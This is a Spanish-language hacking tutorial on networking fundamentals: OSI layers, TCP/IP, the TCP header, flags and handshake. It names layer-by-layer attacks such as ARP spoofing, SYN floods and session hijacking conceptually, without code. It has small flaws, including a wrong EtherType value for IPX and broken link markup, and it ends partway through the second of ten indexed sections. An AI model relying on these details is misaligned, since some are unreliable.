# Fundamentos de Redes para Hacking

> Documento prerequisite / foundations. Si no entendés bien estos conceptos, te va a costar seguir cualquier tutorial de hacking. Esto es pan y agua.

**Nivel:** Principiante a Intermedio
**Duración estimada de lectura:** 2-3 horas (pero volvé todo lo que necesites)
**Target:** 3,000+ líneas de contenido exprimido

---

## Indice

> ⏱️ **Tiempo estimado:** 25 horas (~5 sesiones) (3718 lineas)


1. [Modelo OSI](#modelo-osi)
2. [TCP/IP y Protocolos](#tcpip-y-protocolos)
3. [HTTP/HTTPS](#httphttps)
4. [DNS](#dns)
5. [DHCP](#dhcp)
6. [Subnetting y CIDR](#subnetting-y-cidr)
7. [Sockets y Puertos](#sockets-y-puertos)
8. [Firewalls y NAT](#firewalls-y-nat)
9. [Proxy y VPN](#proxy-y-vpn)
10. [Herramientas de Red](#herramientas-de-red)

---

## [modelo osi](../raw/r3d3s-f0nd4m3nt0s.md#modelo-osi)

### ¿Qué es el modelo OSI?

El modelo OSI (Open Systems Interconnection) es un modelo conceptual que describe cómo funciona la comunicación en una [red](../raw/r3d3s-f0nd4m3nt0s.md). Fue desarrollado por la ISO en 1984 y divide la comunicación en 7 capas. Cada capa tiene una función específica y se comunica con su capa par en el otro extremo.

Para el hacking, entender OSI es fundamental porque te permite entender DÓNDE está ocurriendo algo: ¿un ataque de spoofing? Capa 2. ¿Un [firewall](../raw/s3c-f0nd4m3nt0s.md#firewalls) bloqueando? Capa 3 o 4. ¿Una inyección SQL? Capa 7. Saber en qué capa estás parado te da claridad mental.

### Las 7 Capas de Principio a Fin

#### Capa 1 — Física (Physical)

**Qué hace:** Transmite bits crudos (0s y 1s) a través del medio físico. Define las características eléctricas, mecánicas, de procedimiento y funcionales para activar, mantener y desactivar la conexión física.

**Lo que importa para hacking:**
- Pueden interceptar la señal física (ej: [raspberry pi](../raw/ph7s1c4l-r3d.md#raspberry-pi-p4wn)) con coil inductivo al lado de un cable)
- Los pulsos eléctricos, señales ópticas (fibra) o radiofrecuencias ([wifi](../raw/w1f1-4tt4cks.md), Bluetooth) viven acá
- Si tenés acceso físico al medio, podés hacer sniffing a nivel físico
- Los hubs repiten todo a todos los puertos — no hay segmentación
- Near-field attacks (NFC, [rfid](../raw/ph7s1c4l-r3d.md#rfid)) también operan en esta capa

**Medios físicos comunes:**
- Par trenzado (UTP/STP, categorías 5e, 6, 6a, 7, 8)
- Fibra óptica (monomodo, multimodo)
- Coaxial (ya casi no se usa, pero existe)
- Radiofrecuencia (WiFi 2.4 GHz, 5 GHz, 6 GHz; LTE, 5G)
- Satelital
- Infrarrojo (IR)
- Serial (RS-232, RS-485)
- USB (Universal Serial Bus)

**Dispositivos de Capa 1:**
- **Hub:** recibe una señal eléctrica y la replica en todos los puertos menos el de origen. No tiene inteligencia. Cero seguridad.
- **Repetidor:** amplifica la señal para extender el alcance.
- **Modem:** modula/demodula señal digital a analógica y viceversa.
- **Transceiver:** convierte entre tipos de medios (fibra a cobre).
- **Patch panel:** punto de conexión físico, no procesa señal.

**PDU (Protocol Data Unit):** Bits.

**Para el pentester:** Si podés acceder físicamente al medio, la capa 1 es tu amiga. Un keylogger físico, un clip en un cable, un dispositivo de inductancia en un cable. Pero ojo, la capa 1 no tiene direcciones, no podés filtrar — es todo o nada. Ataques como Van Eck phreaking (capturar radiación electromagnética de monitores/cables) operan acá.

#### Capa 2 — Enlace de Datos (Data Link)

**Qué hace:** Proporciona transferencia de datos confiable a través del enlace físico. Agrupa bits en frames, detecta (y a veces corrige) errores, controla el flujo. Maneja direcciones MAC (48 bits).

**Subcapas:**
- **LLC (Logical Link Control):** Multiplexa protocolos de capa superior ([ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip), IPX, AppleTalk). Control de flujo y detección de errores.
- **MAC (Media Access Control):** Controla el acceso al medio físico. Direccionamiento físico (MAC). CSMA/CD para Ethernet.

**Direcciones MAC:**
- 48 bits, representadas como 6 grupos hex (AA:BB:CC:DD:EE:FF)
- Los primeros 24 bits = OUI (Organizationally Unique Identifier), identifican al fabricante
- Los últimos 24 bits = NIC específica del dispositivo
- Se pueden spoofear (cambiar la MAC con macchanger, ifconfig hw ether, etc.)
- Las MAC se usan para comunicación dentro del mismo segmento de red (LAN)
- MAC multicast: 01:00:5E:xx:xx:xx (IPv4) / 33:33:xx:xx:xx:xx (IPv6)
- MAC broadcast: FF:FF:FF:FF:FF:FF

**Lo que importa para hacking:**
- **[arp spoofing](../raw/m1tm-m0b1l3.md#arp-spoofing):** la [vulnerabilidad](../raw/s3c-f0nd4m3nt0s.md#vulnerabilidades) clásica de capa 2. Envenenás la tabla [arp](../raw/r3d3s-f0nd4m3nt0s.md#arp) de un host y te ponés en el medio ([mitm](../raw/m1tm-m0b1l3.md)).
- **MAC flooding:** saturamos la tabla CAM del [switch](../raw/r3d3s-f0nd4m3nt0s.md#switches) para que se vuelva un hub.
- **STP (Spanning Tree) attacks:** manipulación del [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red) de árbol de expansión.
- **[vlan](../raw/r3d3s-f0nd4m3nt0s.md#vlan) hopping:** saltar entre VLANs usando double tagging (802.1Q).
- Si estás en la misma VLAN que tu víctima, no necesitás IP para atacar.
- **CDP/LDP attacks:** Cisco Discovery Protocol y LLDP pueden revelar información de red.

**PDU:** Frame.

**Dispositivos de Capa 2:**
- **Switch:** aprende direcciones MAC, crea una tabla CAM, envía frames solo al [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) destino. Segmenta el dominio de colisión.
- **Bridge:** conecta dos segmentos de red, aprende MAC.
- **Switch L2:** el estándar. No entiende de [ips](../raw/s3c-f0nd4m3nt0s.md#ids-ips).
- **Access Point (WiFi):** puente entre cable y WiFi (capa 2).

**Ejemplo de frame Ethernet:**
```
| Preámbulo (7B) | SFD (1B) | MAC Destino (6B) | MAC Origen (6B) | EtherType/Length (2B) | Payload (46-1500B) | FCS/CRC (4B) |
```

**EtherType común:**
- 0x0800 = IPv4
- 0x86DD = IPv6
- 0x0806 = ARP
- 0x8100 = VLAN 802.1Q
- 0x88CC = LLDP
- 0x0800 = IPX (Novell, [legacy](../raw/l3g4cy-3nt3rpr1s3.md))

#### Capa 3 — Red (Network)

**Qué hace:** Proporciona direccionamiento lógico (IP) y [enrutamiento](../raw/r3d3s-f0nd4m3nt0s.md#enrutamiento). Determina la mejor ruta para llegar al destino. Fragmenta paquetes si es necesario. No garantiza entrega (eso lo hace capa 4 si es [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp)).

**Lo que importa para hacking:**
- El [router](../raw/r3d3s-f0nd4m3nt0s.md#routers) es el dispositivo clave acá. Si comprometés el [router](../raw/r3d3s-f0nd4m3nt0s.md#routers), tenés la red.
- IP spoofing: falsear la IP de origen.
- Routing attacks: [bGP](../raw/r3d3s-4v4nz4d4s.md#bgp) hijacking, RIP attacks, [ospf](../raw/r3d3s-4v4nz4d4s.md#ospf) attacks.
- Fragmentación: podés evadir [ids](../raw/s3c-f0nd4m3nt0s.md#ids-ips)/IPS con paquetes fragmentados.
- TTL: podés hacer traceroute, detectar saltos, determinar SO por TTL inicial.
- **ICMP tunneling:** encapsular datos en paquetes ICMP para evadir firewalls.
- **IP options abuse:** source routing (obsoleto pero peligroso).

**PDU:** Paquete (packet).

**Dispositivos de Capa 3:**
- **Router:** enruta paquetes entre [redes](../raw/r3d3s-f0nd4m3nt0s.md). Mantiene tablas de ruteo.
- **Switch L3:** switch que también puede rutear (multilayer switch).
- **Gateway:** punto de salida a otra red (generalmente un router).
- **Firewall (capa 3):** filtra por IP.

**Direcciones IP:**
- IPv4: 32 bits, 4 octetos (192.168.1.1)
- IPv6: 128 bits, 8 grupos hex (2001:db8::1)

#### Capa 4 — Transporte (Transport)

**Qué hace:** Proporciona comunicación confiable o no confiable entre procesos en diferentes hosts. Segmenta datos de capa superior y los reensambla. Control de flujo, control de errores, multiplexación con puertos.

**Lo que importa para hacking:**
- **TCP:** orientado a conexión. El [handshake](../raw/w1f1-4tt4cks.md#handshake) SYN/SYN-ACK/ACK es explotable (SYN flood).
- **[udp](../raw/r3d3s-f0nd4m3nt0s.md#udp):** sin conexión. Se usa para [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns), [dhcp](../raw/r3d3s-f0nd4m3nt0s.md#dhcp), SNMP, etc. Fácil de spoofear.
- Los puertos son el "selector de aplicación".
- [escaneo de puertos](../raw/nm4p.md#escaneo-de-puertos): la base de la enumeración.
- Secuencia TCP: si podés predecir los sequence numbers, podés secuestrar una conexión.
- **TCP reset attack:** si conocés los números de secuencia, podés cerrar conexiones ajenas.

**PDU:** Segmento (TCP) o Datagrama (UDP).

**Protocolos clave:**
- TCP (Protocol 6)
- UDP (Protocol 17)
- SCTP (Protocol 132)
- DCCP (Protocol 33)

#### Capa 5 — Sesión (Session)

**Qué hace:** Establece, mantiene y termina sesiones entre aplicaciones. Sincronización, checkpointing, recuperación.

**Ejemplos:**
- NetBIOS (sesiones [smb](../raw/w1nd0ws-p0st3xpl01t.md#smb) en Windows antiguo)
- [rpc](../raw/w1n-s9bsyst3ms.md#rpc) (Remote Procedure Call)
- [ssl](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls))/[tls](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls) handshake (aunque técnicamente opera entre capa 4 y 5)
- SIP (Voice over IP)
- PPTP (túneles [vpn](../raw/4n0n1m4t0.md#vpn))
- SSH (Secure Shell)

**Lo que importa para hacking:**
- Session hijacking: robar el token de sesión.
- NetBIOS/[smb relay](../raw/w1nd0ws-p0st3xpl01t.md#smb-relay) attacks.
- RPC endpoint mapper (Port 135) es un clásico de Windows.
- Session fixation: forzar una sesión conocida en la víctima.
- **[nbt-ns](../raw/w1nd0ws-p0st3xpl01t.md#llmnr-nbt-ns)-[nbt-ns](../raw/w1nd0ws-p0st3xpl01t.md#llmnr-nbt-ns)) poisoning:** envenenamiento NetBIOS para capturar hashes.

**PDU:** Datos (Data).

#### Capa 6 — Presentación (Presentation)

**Qué hace:** Traduce datos entre el formato de la aplicación y el formato de red. [cifrado](../raw/s3c-f0nd4m3nt0s.md#cifrado), compresión, conversión de caracteres.

**Ejemplos:**
- SSL/TLS (algunos modelos lo ponen acá, otros en sesión)
- JPEG, GIF, PNG (compresión de imagen)
- ASCII vs EBCDIC
- MIME (Multipurpose Internet Mail Extensions)
- Unicode vs UTF-8 (codificación)
- XML, JSON (serialización)
- ASN.1 (usado en SNMP, LDAP, Kerberos)
- Base64 encoding (usado en Basic Auth, MIME)

**Lo que importa para hacking:**
- Si el cifrado se hace acá, podés interceptar antes de que se cifre (si estás en el cliente).
- Ataques de compresión (CRIME, BREACH) si hay compresión + cifrado.
- Padding oracle attacks.
- Manipulación de serialización (insecure deserialization) — acá se rompen formatos.
- **SSL stripping:** si podés evitar que el cifrado ocurra, ves todo en claro.

#### Capa 7 — Aplicación (Application)

**Qué hace:** La capa más cercana al usuario. Proporciona servicios de red a las aplicaciones.

**Protocolos:**
- [http](../raw/r3d3s-f0nd4m3nt0s.md#http)/[https](../raw/r3d3s-f0nd4m3nt0s.md#https) (web, el pan nuestro de cada día)
- FTP (File Transfer Protocol)
- SMTP, POP3, IMAP (email)
- DNS (resolución de nombres)
- DHCP (configuración automática)
- SSH (acceso remoto)
- Telnet (acceso remoto inseguro)
- SNMP (monitoreo de red)
- RDP (Remote Desktop)
- VNC (Virtual Network Computing)
- LDAP (Directorio)
- NFS, SMB/CIFS (file sharing)

**Lo que importa para hacking:**
- Acá viven la mayoría de los exploits.
- [sql injection](../raw/w3b-h4ck1ng.md#sql-injection), [xss](../raw/w3b-h4ck1ng.md#xss), [csrf](../raw/w3b-h4ck1ng.md#csrf), [ssrf](../raw/w3b-h4ck1ng.md#ssrf), [lfi](../raw/w3b-h4ck1ng.md#lfi)/[rfi](../raw/w3b-h4ck1ng.md#rfi), [command injection](../raw/w3b-h4ck1ng.md#command-injection).
- [fuzzing](../raw/fuzz1ng.md) de APIs.
- Web scraping.
- Cualquier vulnerabilidad de una aplicación web.
- **Protocol confusion:** HTTP smuggling, FTP bounce, etc.

**PDU:** Datos (Data).

### Encapsulación y Desencapsulación

Cuando enviás datos, pasan de capa 7 a capa 1. Cada capa agrega su header (y a veces footer). Esto se llama encapsulación.

```
Cap7: [Datos de aplicación]
Cap6: [Datos de presentación]
Cap5: [Datos de sesión]
Cap4: [Header TCP] + [Datos] = Segmento
Cap3: [Header IP] + [Segmento] = Paquete
Cap2: [Header Ethernet] + [Paquete] + [FCS] = Frame
Cap1: [Bits]
```

Del lado del receptor, se desencapsula en orden inverso: bits → frame → paquete → segmento → datos.

**PDU por capa:**
| Capa | PDU Name |
|------|----------|
| 1 (Física) | Bits |
| 2 (Enlace) | Frame |
| 3 (Red) | Paquete / Packet |
| 4 (Transporte) | Segmento (TCP) / Datagrama (UDP) |
| 5-7 (Session/Presentación/Aplicación) | Datos / Data |

### Dispositivos por Capa

| Capa | Dispositivo | Qué entiende |
|------|-------------|--------------|
| 1 | Hub, Repetidor, Modem | Bits (señales eléctricas/ópticas) |
| 2 | Switch, Bridge | Frames (direcciones MAC) |
| 3 | Router, L3 Switch | Paquetes (direcciones IP) |
| 4 | Firewall (stateful), Load Balancer | Segmentos (puertos TCP/UDP) |
| 5-7 | Gateway (application-level), [proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy) | Datos de aplicación |

Dato importante: un firewall puede ser capa 3 (filtra por IP), capa 4 (filtra por puerto), o capa 7 (inspecciona contenido HTTP, SQL, etc.). Los firewalls chicos suelen ser 3-4, los enterprise (como Palo Alto, Fortinet) son capa 7.

### Ejemplo Práctico: ¿Qué Pasa Cuando Hacés curl https://google.[com](../raw/w1n-s9bsyst3ms.md#com)?

Vamos de punta a punta con OSI:

**Antes de todo: Resolución DNS (capas 7-3-2-1, ida y vuelta)**

1. **Capa 7 (App):** El [navegador](../raw/br0ws3r-3xpl01t4t10n.md)/curl necesita saber la IP de google.com. Hace una consulta DNS.
2. **Capa 4 (Transporte):** DNS usa UDP, puerto destino 53. Se crea un datagrama UDP.
3. **Capa 3 (Red):** Se arma un paquete IP con src=tu_ip, dst=ip_del_dns (ej: 8.8.8.8).
4. **Capa 2 (Enlace):** Se arma un frame Ethernet con src=tu_mac, dst=mac_del_gateway (porque 8.8.8.8 no está en tu LAN). Si no sabe la MAC del gateway, primero hace ARP.
5. **Capa 1 (Física):** Se transmite como bits por el cable/WiFi.

**Respuesta DNS (viaje inverso):**
1. **Capa 1:** Llegan los bits.
2. **Capa 2:** Se verifica que la MAC destino sea la tuya.
3. **Capa 3:** Se verifica que la IP destino sea la tuya.
4. **Capa 4:** Se abre el datagrama UDP.
5. **Capa 7:** La aplicación recibe la IP de google.com (ej: 142.250.184.78).

**Ahora sí, el HTTPS:**

1. **Capa 7:** curl arma un request HTTP GET /.
2. **Capa 6 (Presentación):** El contenido se va a cifrar con TLS. Se acuerda el cifrado, se intercambian certificados.
3. **Capa 5 (Sesión):** Se establece la sesión TLS.
4. **Capa 4 (Transporte):** TCP handshake con google.com:
   - SYN: Client → Server (seq=1000, port 43210 → 443)
   - SYN-ACK: Server → Client (seq=5000, ack=1001)
   - ACK: Client → Server (seq=1001, ack=5001)
   - Ahora dentro del segmento TCP va el TLS handshake y después el HTTP request cifrado.
5. **Capa 3 (Red):** Cada segmento TCP se envuelve en un paquete IP. Source IP = tu_ip, Dest IP = 142.250.184.78. TTL = 64 (Linux) o 128 (Windows). Protocol = 6 (TCP). Checksum calculado.
6. **Capa 2 (Enlace):** Cada paquete IP se envuelve en un frame Ethernet. Se necesita la MAC del próximo hop. Si está en caché ARP, la usa. Si no, hace ARP request: "¿quién tiene 192.168.1.1 (gateway)?" ARP reply: "yo, mi MAC es aa:bb:cc:dd:ee:ff".
7. **Capa 1 (Física):** Los frames se transmiten como pulsos eléctricos (o radiofrecuencia si es WiFi, o luz si es fibra).

**En el camino (ejemplo con router):**
- El switch de tu casa (capa 2) ve el frame, ve que la MAC destino es la del gateway, lo reenvía solo al puerto del router.
- El router (capa 3) recibe el frame, desencapsula hasta leer la IP destino. Ve que no es para él, consulta su tabla de ruteo. La ruta por defecto (0.0.0.0/0) lo envía al ISP. Re-encapsula con nueva MAC (la del próximo router). Decrementa TTL.
- El paquete viaja por varios routers (saltos) hasta llegar al router de Google.
- Cada router hace lo mismo: recibe, revisa IP destino, consulta tabla de ruteo, reenvía.

**En el servidor de Google:**
1. **Capa 1:** Bits entran por la interfaz de red.
2. **Capa 2:** Se verifica la MAC. Frame aceptado.
3. **Capa 3:** Se verifica la IP. Paquete aceptado.
4. **Capa 4:** Se verifica el segmento TCP. Está en orden. ACK enviado de vuelta.
5. **Capa 5 (Sesión):** TLS session establecida.
6. **Capa 6 (Presentación):** Descifra el contenido HTTP (o al menos maneja el cifrado).
7. **Capa 7 (Aplicación):** El servidor web (Google Front End, GFE) procesa el GET / y prepara la respuesta.

**Respuesta (viaje inverso):**
- Capa 7: HTTP/1.1 200 OK + HTML.
- Capa 6: Cifrado TLS.
- Capa 4: TCP segmenta la respuesta y envía con ACKs.
- Capa 3: Paquetes IP vuelven con dest=tu_ip.
- Capa 2: Frames Ethernet viajan de vuelta.
- Capa 1: Bits viajan por el medio.

**En tu PC:**
- Capa 1 a 7 en orden inverso hasta que curl muestra el HTML en tu terminal.

Este recorrido es ESENCIAL para entender. Cada ataque de red explota algo en algún punto de este camino. Saber dónde estás parado te da poder.

### Para qué sirve OSI en hacking práctico

- **Capa 1 ataque:** Interceptar señal WiFi, hacer jamming, cortar cable, Van Eck phreaking.
- **Capa 2 ataque:** [arp spoofing](../raw/m1tm-m0b1l3.md#arp-spoofing), MAC flooding, VLAN hopping, STP manipulation.
- **Capa 3 ataque:** IP spoofing, BGP hijacking, routing poisoning, ICMP redirect.
- **Capa 4 ataque:** SYN flood, port scanning, session hijacking, TCP RST.
- **Capa 5 ataque:** Session fixation, RPC exploits, NetBIOS poisoning.
- **Capa 6 ataque:** Padding oracle, CRIME/BREACH, deserialization attacks.
- **Capa 7 ataque:** [sqli](../raw/w3b-h4ck1ng.md#sql-injection), XSS, LFI, CSRF, SSRF, command injection, SSI injection.

Cada capa tiene su toolset. [nmap](../raw/nm4p.md) opera mayormente en capa 4 (TCP ports) y capa 3 (ICMP). [wireshark](../raw/r3d3s-f0nd4m3nt0s.md#wireshark) captura de capa 2 para arriba. [tcpdump](../raw/r3d3s-f0nd4m3nt0s.md#tcpdump) puede capturar capa 2 (si usás la interfaz en modo promiscuo).

---

## [tcp/ip](../raw/r3d3s-f0nd4m3nt0s.md#tcp-ip) y Protocolos

### Introducción a [tcp/ip](../raw/r3d3s-f0nd4m3nt0s.md#tcp-ip)

[tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp)/[ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) no es un [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red), es un **suite de protocolos**. Son los protocolos que hacen funcionar Internet. A diferencia del [modelo osi](../raw/r3d3s-f0nd4m3nt0s.md#modelo-osi) (que es teórico), [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp)/[ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) es práctico y fue el que realmente se implementó.

**Modelo TCP/IP (4 capas):**
1. **Acceso a [red](../raw/r3d3s-f0nd4m3nt0s.md) (Network Access):** Equivale a OSI capas 1 y 2. Ethernet, [wifi](../raw/w1f1-4tt4cks.md), PPP.
2. **Internet:** Equivale a OSI capa 3. IP (IPv4, IPv6), [arp](../raw/r3d3s-f0nd4m3nt0s.md#arp), ICMP, IGMP.
3. **Transporte:** Equivale a OSI capa 4. TCP, [udp](../raw/r3d3s-f0nd4m3nt0s.md#udp), SCTP.
4. **Aplicación:** Equivale a OSI capas 5-6-7. [http](../raw/r3d3s-f0nd4m3nt0s.md#http), FTP, [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns), SSH, etc.

Para el resto de este tutorial, vamos a usar OSI porque es más granular y útil para pensar en ataques. Pero recordá: en la práctica, TODO es TCP/IP.
### TCP (Transmission Control Protocol) — En Detalle

TCP es un protocolo orientado a conexión, confiable, con control de flujo y control de congestión. Opera en capa 4.

**Características clave:**
- Orientado a conexión ([handshake](../raw/w1f1-4tt4cks.md#handshake) antes de enviar datos)
- Entrega confiable (ACKs, retransmisiones)
- Control de flujo (ventana deslizante)
- Control de congestión (slow start, congestion avoidance, fast retransmit)
- Entrega ordenada (sequence numbers)
- Detección de errores (checksum)
- Full-duplex (ambos lados pueden enviar simultáneamente)
- Segmentación de datos (MSS, Maximum Segment Size)

#### Segmento TCP — Estructura del Header

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          Puerto Origen         |        Puerto Destino         |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                     Número de Secuencia                        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                 Número de ACK (Reconocimiento)                 |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  Data |       |C|E|U|A|P|R|S|F|                               |
| Offset| Reserv|W|C|R|C|S|S|Y|I|       Ventana                 |
|       |  vado |R|E|G|K|H|T|N|N|                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          Checksum              |       Puntero Urgente         |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Opciones (si hay)                           |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                            Datos                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

**Campos del Header TCP:**

1. **[puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) Origen (16 bits):** 0-65535. [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) de la aplicación que envía.
2. **Puerto Destino (16 bits):** 0-65535. Puerto de la aplicación destino.
3. **Número de Secuencia (32 bits):** Identifica la posición del primer byte de datos en el segmento dentro del stream. En el SYN inicial, es el ISN (Initial Sequence Number).
4. **Número de ACK (32 bits):** Si el flag ACK está activo, este campo contiene el próximo sequence number que el emisor espera recibir. Confirma que todos los bytes anteriores fueron recibidos.
5. **Data Offset (4 bits):** Tamaño del header TCP en palabras de 32 bits (mínimo 5, máximo 15 = 60 bytes).
6. **Reservado (3 bits):** Reservado para futuro uso. Debe ser 0.
7. **Flags (9 bits):** También llamados "control bits". Ver tabla abajo.
8. **Ventana (16 bits):** Cuántos bytes puede enviar el otro lado sin recibir ACK. Control de flujo.
9. **Checksum (16 bits):** Verificación de integridad (header + datos + pseudo-header IP).
10. **[puntero](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#punteros) Urgente (16 bits):** Si URG está activo, señala dónde terminan los datos urgentes.
11. **Opciones (0-320 bits, múltiplos de 32):** MSS, Window Scale, SACK, Timestamp, etc.

#### TCP Flags (los 9 flags)

Cada flag es un bit. Se pueden combinar (ej: SYN-ACK, FIN-ACK).

| Flag | Nombre | Valor Hex | Descripción |
|------|--------|-----------|-------------|
| NS | Nonce Sum | 0x100 | ECN nonce sum — protección contra ECN hiding |
| CWR | Congestion Window Reduced | 0x80 | El emisor redujo su ventana por congestión |
| ECE | ECN-Echo | 0x40 | El receptor soporta ECN, o hubo congestión |
| URG | Urgent | 0x20 | Los datos urgentes están presentes |
| ACK | Acknowledgment | 0x10 | Confirma recepción. Casi siempre activo después del handshake |
| PSH | Push | 0x08 | El emisor pide que los datos se entreguen ya a la app |
| RST | Reset | 0x04 | Resetea la conexión abruptamente |
| SYN | Synchronize | 0x02 | Inicia una conexión. Sincroniza sequence numbers |
| FIN | Finish | 0x01 | Termina la conexión ordenadamente |

**Combinaciones comunes que ves en [wireshark](../raw/r3d3s-f0nd4m3nt0s.md#wireshark):**
- **SYN:** Inicio de conexión
- **SYN-ACK:** Aceptando conexión
- **ACK:** [reconocimiento](../raw/0s1nt.md#reconocimiento)
- **FIN:** Cierre normal
- **FIN-ACK:** Cierre con ACK
- **RST:** Conexión rechazada o abortada
- **RST-ACK:** Reset con ACK
- **PSH-ACK:** Datos siendo enviados
- **URG-PSH-ACK:** Datos urgentes (raro)
- **NULL:** Sin flags (scan evasion)
- **XMAS:** FIN+URG+PSH (scan evasion)

**Para el pentester:**
- Los paquetes SYN son los que usás en [nmap](../raw/nm4p.md) para SYN scan (-sS)
- Si enviás un RST, la conexión se corta al toque
- Los paquetes con flags extraños (como SYN-FIN) a veces pasan firewalls viejos
- Xmas scan (FIN, URG, PSH) y Null scan (flags en 0) son técnicas de evasión
- SYN flood: enviás SYN sin completar el handshake, saturás la cola de conexiones del servidor

#### TCP Three-Way Handshake

El handshake de 3 pasos establece una conexión TCP. Es fundamental entenderlo porque muchos ataques y herramientas se basan en esto.

**Paso 1: SYN**
Cliente → Servidor
- Flag: SYN
- Seq: Cliente elige un ISN (Initial Sequence Number), ej: 1000
- Puerto origen: efímero (ej: 54321)
- Puerto destino: el del servicio (ej: 80, 443)
- MSS anunciado, Window Scale negociado

**Paso 2: SYN-ACK**
Servidor → Cliente
- Flags: SYN + ACK
- Seq: Servidor elige su ISN, ej: 2000
- ACK: 1001 (ISN del cliente + 1)
- Ventana del servidor anunciada

**Paso 3: ACK**
Cliente → Servidor
- Flag: ACK
- Seq: 1001
- ACK: 2001 (ISN del servidor + 1)
- A partir de acá, pueden enviar datos

**Visualización:**
```
CLIENTE                      SERVIDOR
   |                           |
   |-------- SYN (seq=1000) ----------->|
   |                           |
   |<-- SYN-ACK (seq=2000, ack=1001) ----|
   |                           |
   |-------- ACK (seq=1001, ack=2001) --->|
   |                           |
   |==== CONEXIÓN ESTABLECIDA ====|
   |                           |
   |-------- datos ----------------->|
   |<------- datos ------------------|
   |                           |
```

**ISN (Initial Sequence Number):**
- En sistemas modernos, es aleatorio (RFC 1948, RFC 6528)
- En sistemas viejos (Windows 95, algunas implementaciones), era predecible
- Si podés predecir el ISN, podés spoofear una conexión TCP (ataque de Mitnick, TCP sequence prediction)
- Los ISN no empiezan en 0, son números grandes aleatorios

**Estados TCP durante el handshake:**
| Estado | Qué significa | Dónde |
|--------|--------------|-------|
| LISTEN | Esperando conexión | Servidor |
| SYN-SENT | SYN enviado, esperando SYN-ACK | Cliente |
| SYN-RECEIVED | SYN recibido, SYN-ACK enviado, esperando ACK | Servidor |
| ESTABLISHED | Handshake completo, datos fluyen | Ambos |

#### TCP Connection Termination (Cierre)

Hay dos formas de cerrar una conexión TCP:

**Cierre normal (Four-way handshake):**
```
CLIENTE                          SERVIDOR
   |                                |
   |-------- FIN (seq=5000) -------->|
   |                                |
   |<-- ACK (seq=7000, ack=5001) ----|
   |                                |
   |<-- FIN (seq=7000, ack=5001) ----|
   |                                |
   |-------- ACK (seq=5001, ack=7001) ->|
   |                                |
   |==== CONEXIÓN CERRADA ====|
```

**Cierre abrupto (RST):**
- Cualquier lado puede enviar un RST en cualquier momento
- No hay ACK para un RST
- Se usa cuando un lado detecta un error o quiere cortar ya
- O cuando un puerto no tiene un servicio escuchando (connection refused)

**Estados de cierre:**
| Estado | Significado |
|--------|-------------|
| FIN-WAIT-1 | Esperando ACK o FIN del otro lado |
| FIN-WAIT-2 | Recibí ACK, esperando FIN |
| CLOSE-WAIT | Recibí FIN, envié ACK, esperando orden de cerrar |
| CLOSING | Esperando ACK para FIN enviado |
| LAST-ACK | Esperando ACK para FIN |
| TIME-WAIT | Esperando paquetes perdidos antes de cerrar (2*MSL) |
| CLOSED | Conexión terminada |

#### TCP Window (Ventana Deslizante)

La ventana TCP (window) es el mecanismo de **control de flujo**. Le dice al emisor cuántos bytes puede enviar antes de recibir un ACK.

**Cómo funciona:**
1. El receptor anuncia su ventana disponible en cada segmento (campo Window de 16 bits)
2. El emisor no puede enviar más bytes que la ventana sin recibir ACK
3. Si la ventana es 0, el emisor debe esperar (Zero Window)
4. Cuando el receptor procesa datos, envía un ACK con ventana actualizada (Window Update)

**Zero Window:**
- Si el receptor anuncia ventana = 0, el emisor no puede enviar más datos
- El emisor empieza a enviar **Zero Window Probes** (1 byte) periódicamente
- El receptor responde cuando tiene ventana disponible de nuevo
- Si un atacante puede mantener la ventana en 0, puede hacer DoS de la conexión

**Window Scaling:**
- El campo Window original es de 16 bits (máximo 65535 bytes)
- Con Window Scale Option (RFC 1323), se puede escalar hasta 1 GB
- Factor de escala negociado en el handshake SYN/SYN-ACK
- Es por eso que ves ventanas de 65535, 131072, 262144, etc.
- Escala = 0 (sin escala) hasta 14 (factor 16384)

**Sliding Window (visual):**
```
[1][2][3][4][5][6][7][8][9][10]...  ← datos a enviar
     ^        ^
     |        |
  enviado    ventana
  y ACK'do   actual

La ventana se "desliza" a medida que llegan ACKs:
Recibo ACK de [1][2][3][4]:
[ ][ ][ ][ ][5][6][7][8][9][10][11][12]...
              ^           ^
              |           |
           enviado       nueva
           y ACK'do     ventana
```

**Ventana de congestión (cwnd vs rwnd):**
- **rwnd (receiver window):** Lo que el receptor puede recibir (advertised)
- **cwnd (congestion window):** Lo que la red puede manejar (estimado)
